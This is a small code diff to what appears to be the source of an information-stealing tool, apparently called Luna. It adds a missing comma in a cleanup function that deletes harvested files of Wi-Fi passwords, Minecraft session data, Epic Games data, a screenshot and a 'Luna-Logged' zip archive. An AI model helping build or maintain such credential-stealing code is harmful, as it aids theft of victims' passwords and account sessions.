@@ -567,7 +567,7 @@ def cleanup():
                   os.remove("wifi-passwords.txt"),
                   os.remove("minecraft-usercache.json"),
                   os.remove("minecraft-sessioninfo.json"),
-                  os.remove("epicgames-data.txt")
+                  os.remove("epicgames-data.txt"),
                   os.remove("screenshot.png"),
                   os.remove(f"Luna-Logged-{os.getenv('Username')}.zip")]:
         try:
